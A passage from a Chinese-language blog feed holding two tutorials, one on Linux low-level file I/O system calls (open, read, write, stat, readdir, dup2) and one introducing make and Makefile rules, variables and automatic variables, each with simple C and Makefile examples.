    <content type="html"><![CDATA[<p>在Unix系统中，一且皆为文件。一个Linux文件就是一个字符序列，并且所有的I/O设备都被模型化成了文件。而所有的输入输出都被当作对对应文件的读和写。Linux提供了一组简单、低级的接口，使得所有的输入输出都可以用一种简单通用的方式来执行。</p><h2 id="Linux文件的分类"><a href="#Linux文件的分类" class="headerlink" title="Linux文件的分类"></a>Linux文件的分类</h2><p>每一个文件都有一个类型（type）来表示它在系统中的角色，主要有以下几种：</p><ul><li>普通文件。普通文件包括文本文件和二进制文件。</li><li>目录。目录包含一组指向其目录内的连接（link）</li><li>套接字文件。其主要用来和另外的进程进行跨网络通信。</li><li>管道。管道包括匿名管道和命名管道。用来进行进程间的通信。</li><li>符号链接。</li><li>字符和块设备等。</li></ul><h2 id="文件的打开与关闭"><a href="#文件的打开与关闭" class="headerlink" title="文件的打开与关闭"></a>文件的打开与关闭</h2><p>进程通过<code>open</code>函数打开或创建一个新文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功返回文件的描述符，若出错返回-1 */</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的<code>filename</code>可能有些误解，不单单是指文件名，它还可以是相对或绝对路径名。</p></blockquote><p><code>open</code>函数将<code>filename</code>转换为一个文件描述符，返回的描述符总是在当前进程中<strong>没有打开的最小描述符</strong>。</p><blockquote><p>关于文件描述符是如何分配的呢？在Linux中，每一个进程都会维护一个文件描述符表，这个表实现了一个整数到文件的映射关系。在描述符表中，0-2分别对应stdin、stdout和stderr文件。当在进程中要打开一个文件的时候，文件描述符会从3开始分配，然后是4、5…</p></blockquote><p><code>flags</code>指明了进程如何访问这些文件，具体如下：</p><table><thead><tr><th>掩码</th><th>描述</th></tr></thead><tbody><tr><td>O_RDONLY</td><td>只读</td></tr><tr><td>O_WRONLY</td><td>只写</td></tr><tr><td>O_RDWR</td><td>可读可写</td></tr><tr><td>O_CREAT</td><td>如果文件不存在，就创建它的一个截断的空文件</td></tr><tr><td>O_TRUNC</td><td>如果文件已存在，就截断它</td></tr><tr><td>O_APPEND</td><td>在每次读写操作前，设置文件位置到文件的结尾处</td></tr></tbody></table><p>上面这些掩码还可以叠加，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"foo.txt"</span>, O_WRONLY|O_APPEND, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><code>mode</code>参数指明了如果要创建新文件时，新文件的访问权限位。如果只是普通的读写文件，<code>mode</code>一般为0。具体规则如下：</p><table><thead><tr><th>掩码</th><th>描述</th></tr></thead><tbody><tr><td>S_IRUSR</td><td>使用者（拥有者）能够读这个文件</td></tr><tr><td>S_IWUSR</td><td>使用者（拥有者）能够写这个文件</td></tr><tr><td>S_IXUSR</td><td>使用者（拥有者）能够执行这个文件</td></tr><tr><td>S_IRGRP</td><td>拥有者所在组的成员可以读这个文件</td></tr><tr><td>S_IWGRP</td><td>拥有者所在组的成员可以写这个文件</td></tr><tr><td>S_IXGRP</td><td>拥有者所在组的成员可以执行这个文件</td></tr><tr><td>S_IROTH</td><td>其他人（任何人）可以读这个文件</td></tr><tr><td>S_IWOTH</td><td>其他人（任何人）可以写这个文件</td></tr><tr><td>S_IXOTH</td><td>其他人（任何人）可以执行这个文件</td></tr></tbody></table><p>进程通过<code>close</code>函数来关闭一个已经打开的文件。关闭一个已关闭的描述符会出错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功返回0，出错返回-1 */</span></span><br></pre></td></tr></table></figure><h2 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h2><p>进程通过<code>read</code>和<code>write</code>函数来对文件进行读写操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n);</span><br><span class="line"><span class="comment">/* 返回：若成功返回读的字节数，若EOF则为0，若出错则为-1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n);</span><br><span class="line"><span class="comment">/* 返回：若成功返回写的字节数，若出错则为-1 */</span></span><br></pre></td></tr></table></figure><p>例如将从标准输入文件读，写到标准输出文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">while</span>(read(STDIN_FILENO, &amp;c, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">write(STDOUT_FILENO, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>需要说明一下的是，上面两个函数中，<code>ssize_t</code>的类型为<code>long</code>，而<code>size_t</code>的类型是<code>unsigned long</code></p></blockquote><h2 id="读写文件的元数据"><a href="#读写文件的元数据" class="headerlink" title="读写文件的元数据"></a>读写文件的元数据</h2><p>应用程序可以通过<code>stat</code>和<code>fstat</code>函数读取每个文件的详细信息（也叫做文件的元数据）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, struct stat *buf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *buf)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功返回0，出错返回-1 */</span></span><br></pre></td></tr></table></figure><p>上面两个函数都通过填写用来描述文件信息的<code>stat</code>数据结构来获取文件的详细信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span> </span><br><span class="line">     <span class="keyword">dev_t</span>              st_dev;             <span class="comment">// 文件所在设备ID </span></span><br><span class="line">     <span class="keyword">ino_t</span>              st_ino;             <span class="comment">// inode编号 </span></span><br><span class="line">     <span class="keyword">mode_t</span>             st_mode;            <span class="comment">// 保护模式和文件类型</span></span><br><span class="line">     <span class="keyword">nlink_t</span>            st_nlink;           <span class="comment">// 硬链接个数  </span></span><br><span class="line">     <span class="keyword">uid_t</span>              st_uid;             <span class="comment">// 所有者用户ID  </span></span><br><span class="line">     <span class="keyword">gid_t</span>              st_gid;             <span class="comment">// 所有者组ID  </span></span><br><span class="line">     <span class="keyword">dev_t</span>              st_rdev;            <span class="comment">// 设备ID(如果是特殊文件) </span></span><br><span class="line">     <span class="keyword">off_t</span>              st_size;            <span class="comment">// 总体尺寸，以字节为单位 </span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span>      st_blksize;         <span class="comment">// 文件系统 I/O 块大小</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span>      st_blocks;          <span class="comment">// 已分配块个数</span></span><br><span class="line">     <span class="keyword">time_t</span>             st_atime;           <span class="comment">// 上次访问时间 </span></span><br><span class="line">     <span class="keyword">time_t</span>             st_mtime;           <span class="comment">// 上次更新时间 </span></span><br><span class="line">     <span class="keyword">time_t</span>             st_ctime;           <span class="comment">// 上次状态更改时间 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Linux建议我们使用在<code>sys/stat.h</code>中定义的宏谓词来确定<code>st_mode</code>成员的文件类型，例如：</p><ul><li><code>S_ISREG(m)</code>：这是一个普通文件吗？</li><li><code>S_ISDIR(m)</code>：这是一个目录文件吗?</li><li><code>S_ISSOCK(m)</code>：这是一个网络套接字文件吗？</li></ul><p>其他宏谓词就不再赘述。</p><h2 id="读取目录内容"><a href="#读取目录内容" class="headerlink" title="读取目录内容"></a>读取目录内容</h2><p>应用程序可以通过<code>readdir</code>系列函数来读取文件的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DIR *<span class="title">opendir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功，返回处理的指针，否则，返回NULL */</span></span><br></pre></td></tr></table></figure><p><code>opendir</code>返回指向目录流的指针。流是对条目有序列表的抽象，这里是指目录项的列表。</p><p>可以使用<code>readdir</code>函数来读取目录流中的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">struct dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功，则返回下一个目录项的指针；若没有更多目录或出错，者为NULL */</span></span><br></pre></td></tr></table></figure><p>每个目录项都是一个结构，其形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">        <span class="keyword">ino_t</span>  d_ino;           <span class="comment">/* inode */</span></span><br><span class="line">        <span class="keyword">char</span>   d_name[<span class="number">256</span>];     <span class="comment">/* 文件名 */</span></span><br><span class="line">        <span class="comment">/* 虽然在某些Linux系统中还包括其他成员，但上面两个成员对所有Unix系统都是通用的 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后，使用<code>closedir</code>来关闭流并释放所有资源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">closedir</span><span class="params">(DIR *dirp)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功为0，错误为-1 */</span></span><br></pre></td></tr></table></figure><p>下面给出一个读取指定目录文件的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">DIR *streamp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">dep</span>;</span></span><br><span class="line"></span><br><span class="line">streamp = opendir(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">while</span>((dep = readdir(streamp)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, dep-&gt;d_name);</span><br><span class="line">&#125;</span><br><span class="line">closedir(streamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="I-O重定向"><a href="#I-O重定向" class="headerlink" title="I/O重定向"></a>I/O重定向</h2><p>这里稍稍提及一下I/O重定向。上文在介绍文件的打开与关闭的时候提到，每一个进程都会维护一个文件描述符表，这个描述符表的表项由进程打开的文件描述符来索引，描述符表项实现了描述符到真实文件的映射关系。但是，如果我们改变这种映射关系，这便是文件重定向。</p><p>文件重定向可以使用<code>dup2</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> oldfd, <span class="keyword">int</span> newfd)</span></span>;</span><br><span class="line"><span class="comment">/* 返回：若成功返回非负的描述符，若出错返回-1 */</span></span><br></pre></td></tr></table></figure><p><code>dup2</code>实现了将<code>newfd</code>重定向到<code>oldfd</code>，这其中实际上是使用<code>oldfd</code>的表项去覆盖<code>newfd</code>表项以前的内容，如果<code>newfd</code>已经打开，则先关闭<code>newfd</code>再进行覆盖。并且，如果<code>newfd</code>所指向的文件的引用计数变为0，则会释放相应的资源（包括打开文件表、v-node表中的表项）。例如，可以将标准输出重定向到一个文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"foo.txt"</span>, O_WRONLY, <span class="number">0</span>);</span><br><span class="line">dup2(fd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c) != <span class="number">0</span>) &#123;</span><br><span class="line">write(<span class="number">1</span>, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标准I-O"><a href="#标准I-O" class="headerlink" title="标准I/O"></a>标准I/O</h2><p>C语言中提供了标准的I/O库，里面定义了一组高级的输入输出函数。例如：</p><ul><li>打开和关闭文件的<code>fopen</code>和<code>fclose</code></li><li>读和写字节的<code>fread</code>和<code>fwrite</code></li><li>读和写字符串的<code>fgets</code>和<code>fputs</code></li><li>从流中格式化读取和写入的<code>fscanf</code>和<code>fprintf</code></li><li>以及<code>printf</code>、<code>scanf</code>、<code>fprintf</code>等等。</li></ul><p>标准I/O库将打开的文件模型化成一个流，一个流是一个指向<code>FILE</code>结构体的指针。另外，每一个ASCI C程序在开始时都打开三个流<code>stdin</code>、<code>stdout</code>和<code>stderr</code>。</p><p><code>FILE</code>流是对文件描述符和流缓冲区的抽象，因为缓冲区的存在，提高了读取文件的性能。但是标准I/O也不是完美的，也正是由于某些缓冲区的存在，使得标准I/O在网络I/O方面出现短板。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上，主要讨论了如下几个I/O相关的接口：</p><ul><li>用于打开和关闭文件的<code>open</code>和<code>close</code></li><li>用于读取和写入文件的<code>read</code>和<code>write</code></li><li>用于读取文件元数据的<code>stat</code>和<code>fstat</code>，以及判断文件类型的宏谓词</li><li>用于读取目录的<code>opendir</code>、<code>readdir</code>和<code>closedir</code></li><li>C语言提供给我们的更加高级别的I/O接口</li></ul><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在Unix系统中，一且皆为文件。一个Linux文件就是一个字符序列，并且所有的I/O设备都被模型化成了文件。而所有的输入输出都被当作对对应文件的读和写。Linux提供了一组简单、低级的接口，使得所有的输入输出都可以用一种简单通用的方式来执行。&lt;/p&gt;
&lt;h2 id=&quot;Lin
      
    
    </summary>
    
      <category term="Linux" scheme="https://mingliangliu.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>make工具简介</title>
    <link href="https://mingliangliu.com/posts/6aacce01/"/>
    <id>https://mingliangliu.com/posts/6aacce01/</id>
    <published>2019-10-14T13:58:35.000Z</published>
    <updated>2020-02-15T06:45:50.771Z</updated>
    
    <content type="html"><![CDATA[<p>在Linux C/C++的开发过程中，当源代码文件较少时，我们可以手动使用gcc或g++进行编译链接，但是当源代码文件较多且依赖变得复杂时，我们就需要一种简单好用的工具来帮助我们管理。于是，make应运而生。</p><p>make主要用来管理C/C++项目，通过Makefile书写的规则来对项目中的源代码文件进行编译，生成可执行的程序。</p><h2 id="make流程"><a href="#make流程" class="headerlink" title="make流程"></a>make流程</h2><p>make执行的主要过程如下：当在shell中使用make命令时，make会寻找当前目录下的Makefile文件，根据该文件中的规则来确定依赖关系，如果一个文件所依赖的文件比这个文件要新，或者说修改时间更晚，那么make会根据Makefile中指明的命令来重新编译生成该文件。</p><p>另外，make除了自动寻找定义了编译规则的Makefile文件外，还可以手动指明定义了规则的文件。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make -f rule.txt  # rule.txt中为make规则</span><br></pre></td></tr></table></figure><h2 id="Makefile的写法"><a href="#Makefile的写法" class="headerlink" title="Makefile的写法"></a>Makefile的写法</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>Makefile由一系列的规则构成，一条规则的基本格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标 : 条件 </span><br><span class="line">[tab]  命令</span><br></pre></td></tr></table></figure><p>其中，需要在命令之前加一个Tab制表符，并且条件和命令都是可以省略的，但是只能省略其一，条件省略时一般做一些编译以外的其他工作，当命令省略时其实也可以对目标进行编译生成，这涉及到了Makefile中的隐式规则，这里不过多赘述，我们只讨论显式规则。</p><p>如make流程所述，当条件中的文件比目标要新时，会执行tab后的命令。</p><p>Makefile中有很多规则时，当在shell中执行<code>make</code>命令，默认会将第一条规则的目标作为最终生成的目标。</p><p>比如下面这个Makefile例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main: main.o sub.o</span><br><span class="line">gcc -o main main.o sub.o</span><br><span class="line"></span><br><span class="line">sub.o: sub.c sub.h</span><br><span class="line">gcc -c -o sub.o sub.c</span><br><span class="line"></span><br><span class="line">main.o: main.c sub.h</span><br><span class="line">gcc -c -o main.o main.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm sub.o main.o</span><br><span class="line"></span><br><span class="line">.PHONY: clean</span><br></pre></td></tr></table></figure><p>当我们在shell中执行make时，会最终生成<code>main</code>这个最终目标。</p><p>但是如果我们只想生成某个中间的目标也是可以的，比如只生成<code>sub.o</code>，只需要采用<code>make 最终目标</code>的形式就可以了，即<code>make sub.o</code></p><p>注意到示例中省略了条件的那条规则（目标为clean的那条规则），正规上把它叫做伪目标，用来执行一些其他的任务，如本例中清除编译中生成的.o文件。当然，伪目标下的命令可以是多种多样的，比如将<code>clean</code>下的命令改为<code>ls</code>，当执行<code>make clean</code>时，会列出当前目录下的所有文件。但是有一点需要注意的是，如果我们的目录下已经有了一个叫做clean的文件，当我们执行<code>make clean</code>时，make就分不清这个clean到底是那个了，为了避免这种情况，需要用<code>.PHONY: 伪目标1，伪目标2..</code>的方式来显式的声明伪目标。</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>当我们Makefile中的规则变得非常多时，为了方便，也为了可维护性，我们一般使用变量来代替某些信息。</p><p>Makefile中定义变量的格式如下，并用<code>$(变量名)</code>的形式来使用变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名 &lt;赋值符&gt; 变量值</span><br></pre></td></tr></table></figure><p>其中赋值符可以是<code>=</code>、<code>:=</code>、<code>?=</code>、<code>+=</code>。它们的区别如下表：</p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td><code>=</code></td><td>基本的赋值</td></tr><tr><td><code>:=</code></td><td>使用的是当前的值。例如：<code>y := $(x)</code>这句中<code>y</code>会被赋值到这句话时<code>x</code>的值，而<code>y = $(x)</code>会被赋值为<code>x</code>在当前Makefile中最终的值</td></tr><tr><td><code>?=</code></td><td>如果变量未被赋值，那么便被赋予<code>?=</code>后的值</td></tr><tr><td><code>+=</code></td><td>变量添加<code>+=</code>后面的值</td></tr></tbody></table><p>先前示例中便可精简如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">LD = gcc</span><br><span class="line">CFLAGS = -c</span><br><span class="line">OBJS = main.o \</span><br><span class="line">sub.o</span><br><span class="line"></span><br><span class="line">main: $(OBJS)</span><br><span class="line">$(LD) -o  main $(OBJS)</span><br><span class="line"></span><br><span class="line">sub.o: sub.c sub.h</span><br><span class="line">$(CC) $(CFLAGS) -o sub.o sub.c</span><br><span class="line"></span><br><span class="line">main.o: main.c sub.h</span><br><span class="line">$(CC) $(CFLAGS) -o main.o main.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm $(OBJS)</span><br><span class="line">.PHONY: clean</span><br></pre></td></tr></table></figure><blockquote><p>Tip: 有时候我们的规则可能太长，写在一行又不好看，可以使用<code>\</code>来进行换行。</p></blockquote><h3 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h3><p>Makefile中还提供了一些内置变量，比如<code>$(CC)</code>代表默认的C编译器，<code>$(CXX)</code>代表默认的C++编译器。更多内置变量请参考<a href="https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html" target="_blank" rel="noopener">这里</a></p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><p>Makefile中还提供了一些特殊的变量，不用定义且会根据所在的规则而改变，减少一些目标文件名和条件文件名的输入。以下是六个常用的自动变量：</p><table><thead><tr><th>变量名</th><th>作用</th></tr></thead><tbody><tr><td><code>$@</code></td><td>目标的文件名</td></tr><tr><td><code>$&lt;</code></td><td>第一个条件的文件名</td></tr><tr><td><code>$?</code></td><td>时间戳在目标之后的所有条件，并以空格隔开这些条件</td></tr><tr><td><code>$^</code></td><td>所有条件的文件名，并以空格隔开，且排除了重复的条件</td></tr><tr><td><code>$+</code></td><td>与<code>$^</code>类似，只是没有排除重复条件</td></tr><tr><td><code>$*</code></td><td>目标的主文件名，不包含扩展名</td></tr></tbody></table><p>根据以上自动变量，我们可以将上面的示例改成更简便的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">LD = gcc</span><br><span class="line">CFLAGS = -c</span><br><span class="line">OBJS = main.o \</span><br><span class="line">sub.o</span><br><span class="line"></span><br><span class="line">main: $(OBJS)</span><br><span class="line">$(LD) -o $@ $^</span><br><span class="line"></span><br><span class="line">sub.o: sub.c sub.h</span><br><span class="line">$(CC) $(CFLAGS) -o $@ $&lt;</span><br><span class="line"></span><br><span class="line">main.o: main.c sub.h</span><br><span class="line">$(CC) $(CFLAGS) -o $@ $&lt;</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm $(OBJS)</span><br><span class="line">.PHONY: clean</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>另外，尽管make工具常常用来管理C/C++项目，但是用来管理其他项目也是可以的，比如汇编项目，Pascal项目，甚至是node.js的项目，make就是一个工具，来帮我们管理一些构建的规则，只要规则写的得当，怎么用就随你了。</p><p>最后，make虽然可以很好来管理项目了，但是还是不够方便。试想一下，当Makefile中的规则越来越多，又臭又长的时候，make就又显得很难用了，这也就是为什么cmake诞生的原因。通过编写Cmakelist，来指导cmake生成各种Makefile文件和project文件，从而减轻管理Makefile的负担。</p><hr><p>参考：</p><ul><li><a href="https://www.gnu.org/software/make/manual/make.html#Reading" target="_blank" rel="noopener">GNU make</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
